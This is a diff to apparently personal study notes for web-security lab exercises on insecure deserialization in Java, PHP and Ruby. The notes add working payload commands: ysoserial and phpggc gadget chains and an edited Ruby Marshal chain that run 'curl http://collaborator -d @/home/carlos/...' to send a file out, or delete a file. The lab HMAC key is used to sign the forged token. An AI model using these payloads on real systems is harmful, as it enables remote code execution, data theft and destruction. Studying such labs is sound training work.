@@ -12,6 +12,35 @@
   - [6. Exploiting PHP deserialization with a pre-built gadget chain](./lab/6.%20Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain.md)
   - [7. Exploiting Ruby deserialization using a documented gadget chain](./lab/7.%20Exploiting%20Ruby%20deserialization%20using%20a%20documented%20gadget%20chain.md)
 
+## Checklist
+
+dirsearch:
+
+```text
+/cgi-bin/phpinfo.php
+```
+
+xác định phương pháp compress và encode đang sử dụng lên serialized object.
+
+- java:
+
+```shell
+java -jar /mnt/d/Downloads/ysoserial-all.jar CommonsCollections7 'curl http://collaborator -d @/home/carlos/secret' | base64 -w 0
+```
+
+- php:
+
+```shell
+malicious_token=$(phpggc Symfony/RCE4 system 'rm /home/carlos/morale.txt' | base64 -w 0)
+secret_key="pyvlelzjky8ysw99sjhmb0nlnijyer8x"
+output=$(echo -n $malicious_token|openssl sha1 -hmac $secret_key) # SHA1(stdin)= 205c271ee93e2237c69847160252d89e4f9508d6 
+signature=$(echo -n $output|cut -d" " -f2)
+
+echo "{\"token\":\"$malicious_token\",\"sig_hmac_sha1\":\"$signature\"}"
+```
+
+- ruby: edit ruby code below and execute it to get malicious serialized object
+
 ## ysoserial
 
 A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
@@ -62,11 +91,15 @@ My temporary fix: when `set insertion point` does not set to the end of the line
 
 ## phpggc
 
-install:
+install: `sudo apt-get install phpggc`
 
 ```shell
-┌──(kali㉿kali)-[~]
-└─$ sudo apt-get install phpggc  
+malicious_token=$(phpggc Symfony/RCE4 system 'rm /home/carlos/morale.txt' | base64 -w 0)
+secret_key="pyvlelzjky8ysw99sjhmb0nlnijyer8x"
+output=$(echo -n $malicious_token|openssl sha1 -hmac $secret_key) # SHA1(stdin)= 205c271ee93e2237c69847160252d89e4f9508d6 
+signature=$(echo -n $output|cut -d" " -f2)
+
+echo "{\"token\":\"$malicious_token\",\"sig_hmac_sha1\":\"$signature\"}"
 ```
 
 ## ruby
@@ -94,7 +127,7 @@ wa1 = Net::WriteAdapter.new(Kernel, :system)
 rs = Gem::RequestSet.allocate
 rs.instance_variable_set('@sets', wa1)
 #edited
-rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
+rs.instance_variable_set('@git_set', "curl http://collaborator -d @/home/carlos/morale.txt")
 
 wa2 = Net::WriteAdapter.new(rs, :resolve)
 
@@ -115,5 +148,10 @@ r.instance_variable_set('@requirements', t)
 
 payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
 #edited
-puts Base64.encode64(payload)
+puts Base64.strict_encode64(payload)
 ```
+
+## References
+
+- php:
+  - <https://en.wikipedia.org/wiki/PHP_serialization_format>
